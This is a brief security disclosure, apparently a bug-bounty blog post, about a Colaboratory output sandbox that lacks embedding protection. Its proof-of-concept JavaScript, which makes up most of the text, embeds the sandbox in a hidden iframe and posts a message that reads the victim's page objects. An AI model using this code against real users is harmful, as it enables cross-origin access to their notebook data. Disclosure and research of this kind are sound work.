---
title: Insecure sandbox on Colaboratory (Awarded $1337, Not Fixed)
---
Google Colaboratory puts some output such as visualizations into a sandbox however it has no embedding protection such as csp frame-ancestors so the origin is exposed to attackers with local network access.

```js
let w = open('about:blank');
```

On about:blank
```js
opener.location = 'https://colab.research.google.com/';
```

Leak ID from unencrypted DNS then do
```js
let IDfromDNS = 'blah';
let f = document.createElement('iframe');
f.hidden = true;
f.src = 'https://'+IDfromDNS+'-0-colab.googleusercontent.com/outputframe.html';
document.body.appendChild(f);
setTimeout(_ => { f.contentWindow.postMessage({sandboxed_iframe_evaluation: 'console.log(parent.opener[0].google)'}, '*'); }, 100);
```

On the "Welcome to Colaboratory" project using the sandbox embeded on the attackers website.
- ```parent.opener[0].google``` refers to stuff.
- ```parent.opener[5].document``` refers to the chart.

Sometimes sandboxes use a randomly genrated subdomain for isolation unfortunately due to unencrypted DNS this is not safe <https://www.cloudflare.com/learning/dns/dns-over-tls/>
